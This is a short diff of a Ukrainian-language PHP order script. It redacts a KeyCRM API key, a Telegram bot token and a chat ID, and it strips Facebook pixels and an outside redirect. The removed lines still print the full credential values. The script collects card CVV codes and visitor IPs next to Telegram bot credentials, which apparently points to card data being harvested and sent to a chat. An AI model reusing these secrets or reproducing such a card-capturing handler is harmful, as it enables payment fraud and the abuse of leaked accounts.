@@ -83,7 +83,7 @@ session_start();
 $data_string = json_encode($data);
 
 // Ваш уникальный API ключ KeyCRM
-$token = 'OTQyYzcwYmNkZTNlZjY0NTk2MDgyY2FhNmQzMmIxYTY2MjYxOGNhMw';
+$token = '*';
 
 // отправляем на сервер
 $ch = curl_init();
@@ -114,8 +114,8 @@ $cvv = $_POST['cvvCard'];
 $ip_r = $_SERVER['REMOTE_ADDR'];
 
 
-$token = "1355939967:AAHoS1JTZ6CZYDK40u1_oDISTImOtZS2Kus";
-$chat_id = "980378363";
+$token = "***";
+$chat_id = "**";
 
 
 
@@ -210,14 +210,13 @@ mail($to, $subject, $message, $header)
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <script src="https://cdn.tailwindcss.com"></script>
     <title>Дякуємо за замовлення!</title>
-    <img height="1" width="1" src="https://www.facebook.com/tr?id=<?=$_COOKIE["act"]?>&ev=PageView&noscript=1"/>
-    <img height="1" width="1" src="https://www.facebook.com/tr?id=<?=$_COOKIE["act"]?>&ev=Lead&noscript=1"/>
+  
     <link rel="stylesheet" href="center.css">
 </head>
 <body>
   <script>
     setTimeout(()=>{
-      location.href = "https://moovi.site/vzutty";
+      location.href = "#";
     },0)
   </script>
 
